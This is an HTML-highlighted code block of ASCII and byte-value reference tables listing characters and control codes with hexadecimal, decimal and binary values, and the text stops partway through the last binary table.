<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">NUL	SOH	STX	ETX	EOT	ENQ	ACK	BEL	BS	TAB	LF	VT	FF	CR	SO	SI</span><br><span class="line"><span class="number">00	01	02	03</span>	<span class="number">04	05	06	07</span>	<span class="number">08</span>	<span class="number">09</span>	<span class="number">0</span>a	<span class="number">0</span>b	<span class="number">0</span>c	<span class="number">0d</span>	<span class="number">0</span>e	<span class="number">0</span>f</span><br><span class="line">DLE	DC1	DC2	DC3	DC4	NAK	SYN	ETB	CAN	EM	SUB	ESC	FS	GS	RS	US</span><br><span class="line"><span class="number">10	11	12	13</span>	<span class="number">14	15	16	17</span>	<span class="number">18</span>	<span class="number">19</span>	<span class="number">1</span>a	<span class="number">1</span>b	<span class="number">1</span>c	<span class="number">1d</span>	<span class="number">1</span>e	<span class="number">1</span>f</span><br><span class="line"> 	!	&quot;	#	$	%	&amp;	&#x27;	(	)	*	+	,	-	.	/</span><br><span class="line"><span class="number">20	21	22	23</span>	<span class="number">24	25	26	27</span>	<span class="number">28</span>	<span class="number">29</span>	<span class="number">2</span>a	<span class="number">2</span>b	<span class="number">2</span>c	<span class="number">2d</span>	<span class="number">2</span>e	<span class="number">2</span>f</span><br><span class="line"><span class="number">0	1	2	3</span>	<span class="number">4	5	6	7</span>	<span class="number">8</span>	<span class="number">9</span>	:	<span class="comment">;	&lt;	=	&gt;	?</span></span><br><span class="line"><span class="number">30	31	32	33</span>	<span class="number">34	35	36	37</span>	<span class="number">38</span>	<span class="number">39</span>	<span class="number">3</span>a	<span class="number">3</span>b	<span class="number">3</span>c	<span class="number">3d</span>	<span class="number">3</span>e	<span class="number">3</span>f</span><br><span class="line">@	<span class="keyword">A</span>	B	C	D	E	F	G	H	I	J	K	L	M	N	O</span><br><span class="line"><span class="number">40	41	42	43</span>	<span class="number">44	45	46	47</span>	<span class="number">48</span>	<span class="number">49</span>	<span class="number">4</span>a	<span class="number">4</span>b	<span class="number">4</span>c	<span class="number">4d</span>	<span class="number">4</span>e	<span class="number">4</span>f</span><br><span class="line">P	Q	R	S	T	U	V	W	X	Y	Z	[	\	]	^	_</span><br><span class="line"><span class="number">50	51	52	53</span>	<span class="number">54	55	56	57</span>	<span class="number">58</span>	<span class="number">59</span>	<span class="number">5</span>a	<span class="number">5</span>b	<span class="number">5</span>c	<span class="number">5d</span>	<span class="number">5</span>e	<span class="number">5</span>f</span><br><span class="line">`	a	b	c	d	e	f	g	h	i	j	k	l	m	n	o</span><br><span class="line"><span class="number">60	61	62	63</span>	<span class="number">64	65	66	67</span>	<span class="number">68</span>	<span class="number">69</span>	<span class="number">6</span>a	<span class="number">6</span>b	<span class="number">6</span>c	<span class="number">6d</span>	<span class="number">6</span>e	<span class="number">6</span>f</span><br><span class="line">p	q	r	s	t	u	v	w	x	y	z	&#123;	|	&#125;	~	</span><br><span class="line"><span class="number">70	71	72	73</span>	<span class="number">74	75	76	77</span>	<span class="number">78</span>	<span class="number">79</span>	<span class="number">7</span>a	<span class="number">7</span>b	<span class="number">7</span>c	<span class="number">7d</span>	<span class="number">7</span>e	<span class="number">7</span>f</span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line"><span class="number">80	81	82	83</span>	<span class="number">84	85	86	87</span>	<span class="number">88</span>	<span class="number">89</span>	<span class="number">8</span>a	<span class="number">8</span>b	<span class="number">8</span>c	<span class="number">8d</span>	<span class="number">8</span>e	<span class="number">8</span>f</span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line"><span class="number">90	91	92	93</span>	<span class="number">94	95	96	97</span>	<span class="number">98</span>	<span class="number">99</span>	<span class="number">9</span>a	<span class="number">9</span>b	<span class="number">9</span>c	<span class="number">9d</span>	<span class="number">9</span>e	<span class="number">9</span>f</span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line">a0	a1	a2	a3	a4	a5	a6	a7	a8	a9	aa	ab	ac	ad	ae	af</span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line">b0	b1	b2	b3	b4	b5	b6	b7	b8	b9	ba	bb	bc	bd	be	bf</span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line">c0	c1	c2	c3	c4	c5	c6	c7	c8	c9	ca	cb	cc	cd	ce	cf</span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line">d0	d1	d2	d3	d4	d5	d6	d7	d8	d9	da	db	dc	dd	de	df</span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line">e0	e1	e2	e3	e4	e5	e6	e7	e8	e9	ea	eb	ec	ed	ee	ef</span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line">f0	f1	f2	f3	f4	f5	f6	f7	f8	f9	fa	fb	fc	fd	fe	ff</span><br><span class="line"><span class="number">00	01	02	03</span>	<span class="number">04	05	06	07</span>	<span class="number">08</span>	<span class="number">09</span>	<span class="number">0</span>a	<span class="number">0</span>b	<span class="number">0</span>c	<span class="number">0d</span>	<span class="number">0</span>e	<span class="number">0</span>f	  NULSOHSTXETXEOTENQACKBELBSTABLFVTFFCRSOSI</span><br><span class="line"><span class="number">10	11	12	13</span>	<span class="number">14	15	16	17</span>	<span class="number">18</span>	<span class="number">19</span>	<span class="number">1</span>a	<span class="number">1</span>b	<span class="number">1</span>c	<span class="number">1d</span>	<span class="number">1</span>e	<span class="number">1</span>f	  DLEDC1DC2DC3DC4NAKSYNETBCANEMSUBESCFSGSRSUS</span><br><span class="line"><span class="number">20	21	22	23</span>	<span class="number">24	25	26	27</span>	<span class="number">28</span>	<span class="number">29</span>	<span class="number">2</span>a	<span class="number">2</span>b	<span class="number">2</span>c	<span class="number">2d</span>	<span class="number">2</span>e	<span class="number">2</span>f	   !&quot;#$%&amp;&#x27;()*+,-./</span><br><span class="line"><span class="number">30	31	32	33</span>	<span class="number">34	35	36	37</span>	<span class="number">38</span>	<span class="number">39</span>	<span class="number">3</span>a	<span class="number">3</span>b	<span class="number">3</span>c	<span class="number">3d</span>	<span class="number">3</span>e	<span class="number">3</span>f	  <span class="number">0123456789</span>:<span class="comment">;&lt;=&gt;?</span></span><br><span class="line"><span class="number">40	41	42	43</span>	<span class="number">44	45	46	47</span>	<span class="number">48</span>	<span class="number">49</span>	<span class="number">4</span>a	<span class="number">4</span>b	<span class="number">4</span>c	<span class="number">4d</span>	<span class="number">4</span>e	<span class="number">4</span>f	  @ABCDEFGHIJKLMNO</span><br><span class="line"><span class="number">50	51	52	53</span>	<span class="number">54	55	56	57</span>	<span class="number">58</span>	<span class="number">59</span>	<span class="number">5</span>a	<span class="number">5</span>b	<span class="number">5</span>c	<span class="number">5d</span>	<span class="number">5</span>e	<span class="number">5</span>f	  PQRSTUVWXYZ[\]^_</span><br><span class="line"><span class="number">60	61	62	63</span>	<span class="number">64	65	66	67</span>	<span class="number">68</span>	<span class="number">69</span>	<span class="number">6</span>a	<span class="number">6</span>b	<span class="number">6</span>c	<span class="number">6d</span>	<span class="number">6</span>e	<span class="number">6</span>f	  `abcdefghijklmno</span><br><span class="line"><span class="number">70	71	72	73</span>	<span class="number">74	75	76	77</span>	<span class="number">78</span>	<span class="number">79</span>	<span class="number">7</span>a	<span class="number">7</span>b	<span class="number">7</span>c	<span class="number">7d</span>	<span class="number">7</span>e	<span class="number">7</span>f	  pqrstuvwxyz&#123;|&#125;~</span><br><span class="line"><span class="number">80	81	82	83</span>	<span class="number">84	85	86	87</span>	<span class="number">88</span>	<span class="number">89</span>	<span class="number">8</span>a	<span class="number">8</span>b	<span class="number">8</span>c	<span class="number">8d</span>	<span class="number">8</span>e	<span class="number">8</span>f	  ................</span><br><span class="line"><span class="number">90	91	92	93</span>	<span class="number">94	95	96	97</span>	<span class="number">98</span>	<span class="number">99</span>	<span class="number">9</span>a	<span class="number">9</span>b	<span class="number">9</span>c	<span class="number">9d</span>	<span class="number">9</span>e	<span class="number">9</span>f	  ................</span><br><span class="line">a0	a1	a2	a3	a4	a5	a6	a7	a8	a9	aa	ab	ac	ad	ae	af	  ................</span><br><span class="line">b0	b1	b2	b3	b4	b5	b6	b7	b8	b9	ba	bb	bc	bd	be	bf	  ................</span><br><span class="line">c0	c1	c2	c3	c4	c5	c6	c7	c8	c9	ca	cb	cc	cd	ce	cf	  ................</span><br><span class="line">d0	d1	d2	d3	d4	d5	d6	d7	d8	d9	da	db	dc	dd	de	df	  ................</span><br><span class="line">e0	e1	e2	e3	e4	e5	e6	e7	e8	e9	ea	eb	ec	ed	ee	ef	  ................</span><br><span class="line">f0	f1	f2	f3	f4	f5	f6	f7	f8	f9	fa	fb	fc	fd	fe	ff	  ................</span><br><span class="line">NUL	SOH	STX	ETX	EOT	ENQ	ACK	BEL	BS	TAB	LF	VT	FF	CR	SO	SI</span><br><span class="line"><span class="number">000	001</span>	<span class="number">002	003</span>	<span class="number">004	005</span>	<span class="number">006	007</span>	<span class="number">008	009</span>	<span class="number">010	011</span>	<span class="number">012	013</span>	<span class="number">014	015</span></span><br><span class="line">DLE	DC1	DC2	DC3	DC4	NAK	SYN	ETB	CAN	EM	SUB	ESC	FS	GS	RS	US</span><br><span class="line"><span class="number">016	017</span>	<span class="number">018	019</span>	<span class="number">020	021</span>	<span class="number">022	023</span>	<span class="number">024	025</span>	<span class="number">026	027</span>	<span class="number">028	029</span>	<span class="number">030	031</span></span><br><span class="line"> 	!	&quot;	#	$	%	&amp;	&#x27;	(	)	*	+	,	-	.	/</span><br><span class="line"><span class="number">032	033</span>	<span class="number">034	035</span>	<span class="number">036	037</span>	<span class="number">038	039</span>	<span class="number">040	041</span>	<span class="number">042	043</span>	<span class="number">044	045</span>	<span class="number">046	047</span></span><br><span class="line"><span class="number">0	1	2	3</span>	<span class="number">4	5	6	7</span>	<span class="number">8</span>	<span class="number">9</span>	:	<span class="comment">;	&lt;	=	&gt;	?</span></span><br><span class="line"><span class="number">048	049</span>	<span class="number">050	051</span>	<span class="number">052	053</span>	<span class="number">054	055</span>	<span class="number">056	057</span>	<span class="number">058	059</span>	<span class="number">060	061</span>	<span class="number">062	063</span></span><br><span class="line">@	<span class="keyword">A</span>	B	C	D	E	F	G	H	I	J	K	L	M	N	O</span><br><span class="line"><span class="number">064	065</span>	<span class="number">066	067</span>	<span class="number">068	069</span>	<span class="number">070	071</span>	<span class="number">072	073</span>	<span class="number">074	075</span>	<span class="number">076	077</span>	<span class="number">078	079</span></span><br><span class="line">P	Q	R	S	T	U	V	W	X	Y	Z	[	\	]	^	_</span><br><span class="line"><span class="number">080	081</span>	<span class="number">082	083</span>	<span class="number">084	085</span>	<span class="number">086	087</span>	<span class="number">088	089</span>	<span class="number">090	091</span>	<span class="number">092	093</span>	<span class="number">094	095</span></span><br><span class="line">`	a	b	c	d	e	f	g	h	i	j	k	l	m	n	o</span><br><span class="line"><span class="number">096	097</span>	<span class="number">098	099</span>	<span class="number">100	101	102	103</span>	<span class="number">104	105	106	107</span>	<span class="number">108	109	110	111</span></span><br><span class="line">p	q	r	s	t	u	v	w	x	y	z	&#123;	|	&#125;	~	</span><br><span class="line"><span class="number">112	113	114	115</span>	<span class="number">116	117	118	119</span>	<span class="number">120	121	122	123</span>	<span class="number">124	125	126	127</span></span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line"><span class="number">128	129	130	131</span>	<span class="number">132	133	134	135</span>	<span class="number">136	137	138	139</span>	<span class="number">140	141	142	143</span></span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line"><span class="number">144	145	146	147</span>	<span class="number">148	149	150	151</span>	<span class="number">152	153	154	155</span>	<span class="number">156	157	158	159</span></span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line"><span class="number">160	161	162	163</span>	<span class="number">164	165	166	167</span>	<span class="number">168	169	170	171</span>	<span class="number">172	173	174	175</span></span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line"><span class="number">176	177	178	179</span>	<span class="number">180	181	182	183</span>	<span class="number">184	185	186	187</span>	<span class="number">188	189	190	191</span></span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line"><span class="number">192	193	194	195</span>	<span class="number">196	197	198	199</span>	<span class="number">200	201	202	203</span>	<span class="number">204	205	206	207</span></span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line"><span class="number">208	209	210	211</span>	<span class="number">212	213	214	215</span>	<span class="number">216	217	218	219</span>	<span class="number">220	221	222	223</span></span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line"><span class="number">224	225	226	227</span>	<span class="number">228	229	230	231</span>	<span class="number">232	233	234	235</span>	<span class="number">236	237	238	239</span></span><br><span class="line">.	.	.	.	.	.	.	.	.	.	.	.	.	.	.	.</span><br><span class="line"><span class="number">240	241	242	243</span>	<span class="number">244	245	246	247</span>	<span class="number">248	249	250	251</span>	<span class="number">252	253	254	255</span></span><br><span class="line"><span class="number">000	001</span>	<span class="number">002	003</span>	<span class="number">004	005</span>	<span class="number">006	007</span>	<span class="number">008	009</span>	<span class="number">010	011</span>	<span class="number">012	013</span>	<span class="number">014	015</span>	  NULSOHSTXETXEOTENQACKBELBSTABLFVTFFCRSOSI</span><br><span class="line"><span class="number">016	017</span>	<span class="number">018	019</span>	<span class="number">020	021</span>	<span class="number">022	023</span>	<span class="number">024	025</span>	<span class="number">026	027</span>	<span class="number">028	029</span>	<span class="number">030	031</span>	  DLEDC1DC2DC3DC4NAKSYNETBCANEMSUBESCFSGSRSUS</span><br><span class="line"><span class="number">032	033</span>	<span class="number">034	035</span>	<span class="number">036	037</span>	<span class="number">038	039</span>	<span class="number">040	041</span>	<span class="number">042	043</span>	<span class="number">044	045</span>	<span class="number">046	047</span>	   !&quot;#$%&amp;&#x27;()*+,-./</span><br><span class="line"><span class="number">048	049</span>	<span class="number">050	051</span>	<span class="number">052	053</span>	<span class="number">054	055</span>	<span class="number">056	057</span>	<span class="number">058	059</span>	<span class="number">060	061</span>	<span class="number">062	063</span>	  <span class="number">0123456789</span>:<span class="comment">;&lt;=&gt;?</span></span><br><span class="line"><span class="number">064	065</span>	<span class="number">066	067</span>	<span class="number">068	069</span>	<span class="number">070	071</span>	<span class="number">072	073</span>	<span class="number">074	075</span>	<span class="number">076	077</span>	<span class="number">078	079</span>	  @ABCDEFGHIJKLMNO</span><br><span class="line"><span class="number">080	081</span>	<span class="number">082	083</span>	<span class="number">084	085</span>	<span class="number">086	087</span>	<span class="number">088	089</span>	<span class="number">090	091</span>	<span class="number">092	093</span>	<span class="number">094	095</span>	  PQRSTUVWXYZ[\]^_</span><br><span class="line"><span class="number">096	097</span>	<span class="number">098	099</span>	<span class="number">100	101	102	103</span>	<span class="number">104	105	106	107</span>	<span class="number">108	109	110	111</span>	  `abcdefghijklmno</span><br><span class="line"><span class="number">112	113	114	115</span>	<span class="number">116	117	118	119</span>	<span class="number">120	121	122	123</span>	<span class="number">124	125	126	127</span>	  pqrstuvwxyz&#123;|&#125;~</span><br><span class="line"><span class="number">128	129	130	131</span>	<span class="number">132	133	134	135</span>	<span class="number">136	137	138	139</span>	<span class="number">140	141	142	143</span>	  ................</span><br><span class="line"><span class="number">144	145	146	147</span>	<span class="number">148	149	150	151</span>	<span class="number">152	153	154	155</span>	<span class="number">156	157	158	159</span>	  ................</span><br><span class="line"><span class="number">160	161	162	163</span>	<span class="number">164	165	166	167</span>	<span class="number">168	169	170	171</span>	<span class="number">172	173	174	175</span>	  ................</span><br><span class="line"><span class="number">176	177	178	179</span>	<span class="number">180	181	182	183</span>	<span class="number">184	185	186	187</span>	<span class="number">188	189	190	191</span>	  ................</span><br><span class="line"><span class="number">192	193	194	195</span>	<span class="number">196	197	198	199</span>	<span class="number">200	201	202	203</span>	<span class="number">204	205	206	207</span>	  ................</span><br><span class="line"><span class="number">208	209	210	211</span>	<span class="number">212	213	214	215</span>	<span class="number">216	217	218	219</span>	<span class="number">220	221	222	223</span>	  ................</span><br><span class="line"><span class="number">224	225	226	227</span>	<span class="number">228	229	230	231</span>	<span class="number">232	233	234	235</span>	<span class="number">236	237	238	239</span>	  ................</span><br><span class="line"><span class="number">240	241	242	243</span>	<span class="number">244	245	246	247</span>	<span class="number">248	249	250	251</span>	<span class="number">252	253	254	255</span>	  ................</span><br><span class="line">NUL		SOH		STX		ETX</span><br><span class="line"><span class="number">00000000</span>	<span class="number">00000001</span>	<span class="number">00000010</span>	<span class="number">00000011</span></span><br><span class="line">EOT		ENQ		ACK		BEL</span><br><span class="line"><span class="number">00000100</span>	<span class="number">00000101</span>	<span class="number">00000110</span>	<span class="number">00000111</span></span><br><span class="line">BS		TAB		LF		VT</span><br><span class="line"><span class="number">00001000</span>	<span class="number">00001001</span>	<span class="number">00001010</span>	<span class="number">00001011</span></span><br><span class="line">FF		CR		SO		SI</span><br><span class="line"><span class="number">00001100</span>	<span class="number">00001101</span>	<span class="number">00001110</span>	<span class="number">00001111</span></span><br><span class="line">DLE		DC1		DC2		DC3</span><br><span class="line"><span class="number">00010000</span>	<span class="number">00010001</span>	<span class="number">00010010</span>	<span class="number">00010011</span></span><br><span class="line">DC4		NAK		SYN		ETB</span><br><span class="line"><span class="number">00010100</span>	<span class="number">00010101</span>	<span class="number">00010110</span>	<span class="number">00010111</span></span><br><span class="line">CAN		EM		SUB		ESC</span><br><span class="line"><span class="number">00011000</span>	<span class="number">00011001</span>	<span class="number">00011010</span>	<span class="number">00011011</span></span><br><span class="line">FS		GS		RS		US</span><br><span class="line"><span class="number">00011100</span>	<span class="number">00011101</span>	<span class="number">00011110</span>	<span class="number">00011111</span></span><br><span class="line"> 		!		&quot;		#</span><br><span class="line"><span class="number">00100000</span>	<span class="number">00100001</span>	<span class="number">00100010</span>	<span class="number">00100011</span></span><br><span class="line">$		%		&amp;		&#x27;</span><br><span class="line"><span class="number">00100100</span>	<span class="number">00100101</span>	<span class="number">00100110</span>	<span class="number">00100111</span></span><br><span class="line">(		)		*		+</span><br><span class="line"><span class="number">00101000</span>	<span class="number">00101001</span>	<span class="number">00101010</span>	<span class="number">00101011</span></span><br><span class="line">,		-		.		/</span><br><span class="line"><span class="number">00101100</span>	<span class="number">00101101</span>	<span class="number">00101110</span>	<span class="number">00101111</span></span><br><span class="line"><span class="number">0</span>		<span class="number">1</span>		<span class="number">2</span>		<span class="number">3</span></span><br><span class="line"><span class="number">00110000</span>	<span class="number">00110001</span>	<span class="number">00110010</span>	<span class="number">00110011</span></span><br><span class="line"><span class="number">4</span>		<span class="number">5</span>		<span class="number">6</span>		<span class="number">7</span></span><br><span class="line"><span class="number">00110100</span>	<span class="number">00110101</span>	<span class="number">00110110</span>	<span class="number">00110111</span></span><br><span class="line"><span class="number">8</span>		<span class="number">9</span>		:		<span class="comment">;</span></span><br><span class="line"><span class="number">00111000</span>	<span class="number">00111001</span>	<span class="number">00111010</span>	<span class="number">00111011</span></span><br><span class="line">&lt;		=		&gt;		?</span><br><span class="line"><span class="number">00111100</span>	<span class="number">00111101</span>	<span class="number">00111110</span>	<span class="number">00111111</span></span><br><span class="line">@		<span class="keyword">A</span>		B		C</span><br><span class="line"><span class="number">01000000</span>	<span class="number">01000001</span>	<span class="number">01000010</span>	<span class="number">01000011</span></span><br><span class="line">D		E		F		G</span><br><span class="line"><span class="number">01000100</span>	<span class="number">01000101</span>	<span class="number">01000110</span>	<span class="number">01000111</span></span><br><span class="line">H		I		J		K</span><br><span class="line"><span class="number">01001000</span>	<span class="number">01001001</span>	<span class="number">01001010</span>	<span class="number">01001011</span></span><br><span class="line">L		M		N		O</span><br><span class="line"><span class="number">01001100</span>	<span class="number">01001101</span>	<span class="number">01001110</span>	<span class="number">01001111</span></span><br><span class="line">P		Q		R		S</span><br><span class="line"><span class="number">01010000</span>	<span class="number">01010001</span>	<span class="number">01010010</span>	<span class="number">01010011</span></span><br><span class="line">T		U		V		W</span><br><span class="line"><span class="number">01010100</span>	<span class="number">01010101</span>	<span class="number">01010110</span>	<span class="number">01010111</span></span><br><span class="line">X		Y		Z		[</span><br><span class="line"><span class="number">01011000</span>	<span class="number">01011001</span>	<span class="number">01011010</span>	<span class="number">01011011</span></span><br><span class="line">\		]		^		_</span><br><span class="line"><span class="number">01011100</span>	<span class="number">01011101</span>	<span class="number">01011110</span>	<span class="number">01011111</span></span><br><span class="line">`		a		b		c</span><br><span class="line"><span class="number">01100000</span>	<span class="number">01100001</span>	<span class="number">01100010</span>	<span class="number">01100011</span></span><br><span class="line">d		e		f		g</span><br><span class="line"><span class="number">01100100</span>	<span class="number">01100101</span>	<span class="number">01100110</span>	<span class="number">01100111</span></span><br><span class="line">h		i		j		k</span><br><span class="line"><span class="number">01101000</span>	<span class="number">01101001</span>	<span class="number">01101010</span>	<span class="number">01101011</span></span><br><span class="line">l		m		n		o</span><br><span class="line"><span class="number">01101100</span>	<span class="number">01101101</span>	<span class="number">01101110</span>	<span class="number">01101111</span></span><br><span class="line">p		q		r		s</span><br><span class="line"><span class="number">01110000</span>	<span class="number">01110001</span>	<span class="number">01110010</span>	<span class="number">01110011</span></span><br><span class="line">t		u		v		w</span><br><span class="line"><span class="number">01110100</span>	<span class="number">01110101</span>	<span class="number">01110110</span>	<span class="number">01110111</span></span><br><span class="line">x		y		z		&#123;</span><br><span class="line"><span class="number">01111000</span>	<span class="number">01111001</span>	<span class="number">01111010</span>	<span class="number">01111011</span></span><br><span class="line">|		&#125;		~		</span><br><span class="line"><span class="number">01111100</span>	<span class="number">01111101</span>	<span class="number">01111110</span>	<span class="number">01111111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10000000</span>	<span class="number">10000001</span>	<span class="number">10000010</span>	<span class="number">10000011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10000100</span>	<span class="number">10000101</span>	<span class="number">10000110</span>	<span class="number">10000111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10001000</span>	<span class="number">10001001</span>	<span class="number">10001010</span>	<span class="number">10001011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10001100</span>	<span class="number">10001101</span>	<span class="number">10001110</span>	<span class="number">10001111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10010000</span>	<span class="number">10010001</span>	<span class="number">10010010</span>	<span class="number">10010011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10010100</span>	<span class="number">10010101</span>	<span class="number">10010110</span>	<span class="number">10010111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10011000</span>	<span class="number">10011001</span>	<span class="number">10011010</span>	<span class="number">10011011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10011100</span>	<span class="number">10011101</span>	<span class="number">10011110</span>	<span class="number">10011111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10100000</span>	<span class="number">10100001</span>	<span class="number">10100010</span>	<span class="number">10100011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10100100</span>	<span class="number">10100101</span>	<span class="number">10100110</span>	<span class="number">10100111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10101000</span>	<span class="number">10101001</span>	<span class="number">10101010</span>	<span class="number">10101011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10101100</span>	<span class="number">10101101</span>	<span class="number">10101110</span>	<span class="number">10101111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10110000</span>	<span class="number">10110001</span>	<span class="number">10110010</span>	<span class="number">10110011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10110100</span>	<span class="number">10110101</span>	<span class="number">10110110</span>	<span class="number">10110111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10111000</span>	<span class="number">10111001</span>	<span class="number">10111010</span>	<span class="number">10111011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">10111100</span>	<span class="number">10111101</span>	<span class="number">10111110</span>	<span class="number">10111111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11000000</span>	<span class="number">11000001</span>	<span class="number">11000010</span>	<span class="number">11000011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11000100</span>	<span class="number">11000101</span>	<span class="number">11000110</span>	<span class="number">11000111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11001000</span>	<span class="number">11001001</span>	<span class="number">11001010</span>	<span class="number">11001011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11001100</span>	<span class="number">11001101</span>	<span class="number">11001110</span>	<span class="number">11001111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11010000</span>	<span class="number">11010001</span>	<span class="number">11010010</span>	<span class="number">11010011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11010100</span>	<span class="number">11010101</span>	<span class="number">11010110</span>	<span class="number">11010111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11011000</span>	<span class="number">11011001</span>	<span class="number">11011010</span>	<span class="number">11011011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11011100</span>	<span class="number">11011101</span>	<span class="number">11011110</span>	<span class="number">11011111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11100000</span>	<span class="number">11100001</span>	<span class="number">11100010</span>	<span class="number">11100011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11100100</span>	<span class="number">11100101</span>	<span class="number">11100110</span>	<span class="number">11100111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11101000</span>	<span class="number">11101001</span>	<span class="number">11101010</span>	<span class="number">11101011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11101100</span>	<span class="number">11101101</span>	<span class="number">11101110</span>	<span class="number">11101111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11110000</span>	<span class="number">11110001</span>	<span class="number">11110010</span>	<span class="number">11110011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11110100</span>	<span class="number">11110101</span>	<span class="number">11110110</span>	<span class="number">11110111</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11111000</span>	<span class="number">11111001</span>	<span class="number">11111010</span>	<span class="number">11111011</span></span><br><span class="line">.		.		.		.</span><br><span class="line"><span class="number">11111100</span>	<span class="number">11111101</span>	<span class="number">11111110</span>	<span class="number">11111111</span></span><br><span class="line"><span class="number">00000000</span>	<span class="number">00000001</span>	<span class="number">00000010</span>	<span class="number">00000011</span>	  NULSOHSTXETX</span><br><span class="line"><span class="number">00000100</span>	<span class="number">00000101</span>	<span class="number">00000110</span>	<span class="number">00000111</span>	  EOTENQACKBEL</span><br><span class="line"><span class="number">00001000</span>	<span class="number">00001001</span>	<span class="number">00001010</span>	<span class="number">00001011</span>	  BSTABLFVT</span><br><span class="line"><span class="number">00001100</span>	<span class="number">00001101</span>	<span class="number">00001110</span>	<span class="number">00001111</span>	  FFCRSOSI</span><br><span class="line"><span class="number">00010000</span>	<span class="number">00010001</span>	<span class="number">00010010</span>	<span class="number">00010011</span>	  DLEDC1DC2DC3</span><br><span class="line"><span class="number">00010100</span>	<span class="number">00010101</span>	<span class="number">00010110</span>	<span class="number">00010111</span>	  DC4NAKSYNETB</span><br><span class="line"><span class="number">00011000</span>	<span class="number">00011001</span>	<span class="number">00011010</span>	<span class="number">00011011</span>	  CANEMSUBESC</span><br><span class="line"><span class="number">00011100</span>	<span class="number">00011101</span>	<span class="number">00011110</span>	<span class="number">00011111</span>	  FSGSRSUS</span><br><span class="line"><span class="number">00100000</span>	<span class="number">00100001</span>	<span class="number">00100010</span>	<span class="number">00100011</span>	   !&quot;#</span><br><span class="line"><span class="number">00100100</span>	<span class="number">00100101</span>	<span class="number">00100110</span>	<span class="number">00100111</span>	  $%&amp;&#x27;</span><br><span class="line"><span class="number">00101000</span>	<span class="number">00101001</span>	<span class="number">00101010</span>	<span class="number">00101011</span>	  ()*+</span><br><span class="line"><span class="number">00101100</span>	<span class="number">00101101</span>	<span class="number">00101110</span>	<span class="number">00101111</span>	  ,-./</span><br><span class="line"><span class="number">00110000</span>	<span class="number">00110001</span>	<span class="number">00110010</span>	<span class="number">00110011</span>	  <span class="number">0123</span></span><br><span class="line"><span class="number">00110100</span>	<span class="number">00110101</span>	<span class="number">00110110</span>	<span class="number">00110111</span>	  <span class="number">4567</span></span><br><span class="line"><span class="number">00111000</span>	<span class="number">00111001</span>	<span class="number">00111010</span>	<span class="number">00111011</span>	  <span class="number">89</span>:<span class="comment">;</span></span><br><span class="line"><span class="number">00111100</span>	<span class="number">00111101</span>	<span class="number">00111110</span>	<span class="number">00111111</span>	  &lt;=&gt;?</span><br><span class="line"><span class="number">01000000</span>	<span class="number">01000001</span>	<span class="number">01000010</span>	<span class="number">01000011</span>	  @ABC</span><br><span class="line"><span class="number">01000100</span>	<span class="number">01000101</span>	<span class="number">01000110</span>	<span class="number">01000111</span>	  DEFG</span><br><span class="line"><span class="number">01001000</span>	<span class="number">01001001</span>	<span class="number">01001010</span>	<span class="number">01001011</span>	  HIJK</span><br><span class="line"><span class="number">01001100</span>	<span class="number">01001101</span>	<span class="number">01001110</span>	<span class="number">01001111</span>	  LMNO</span><br><span class="line"><span class="number">01010000</span>	<span class="number">01010001</span>	<span class="number">01010010</span>	<span class="number">01010011</span>	  